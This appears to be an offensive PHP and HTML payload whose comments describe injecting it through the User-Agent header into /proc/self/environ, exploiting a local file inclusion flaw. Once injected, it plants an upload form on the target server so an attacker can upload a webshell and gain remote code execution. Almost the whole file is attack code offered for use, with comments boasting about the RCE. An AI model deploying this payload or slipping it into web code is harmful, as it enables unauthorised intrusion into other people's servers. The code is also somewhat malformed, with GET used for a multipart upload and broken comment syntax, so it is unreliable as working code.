
// this malicious system level payload is to be injected in the User-agent header of the HTTP-header field proxied by the web proxy
   like burp-suite in ../proc/self/environ section of the site/server accessed with the vulnerable web application 
   
   
   <!-- created by Me : 789sk.gupta@gmail.com -->
<!-- This is a php script which provides a interface(GUI) to upload a shell/malicious file from attacker computer 
     to the target server --!>
<!-- after the file upload attacker can directly access/execute the malicious payload and perform RCE;))) --!> 

<!-- Remote code execution payload by exploiting the LFI vulnerbility.--!>

// There is also require to encode the payload sometimes before sending to the server .   


<form enctype="multipart/form-data" action="#" method="GET">
<input name="uploadedfile" type="file"/></input>
<input type="submit" value="Uploadhere"/>
</form>  <!-- form closed --!>
<?php 
  $target_path=basename($_FILES["uploadedfile"]["name"]);
    if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'],$target_path))
         {
              echo  basename($_FILES["uploadedfile"]["name"]). "is succefully uploaded on the remote server" ;

                    }else 
    {
        echo "Error uploading the webshell";
} ?>


   
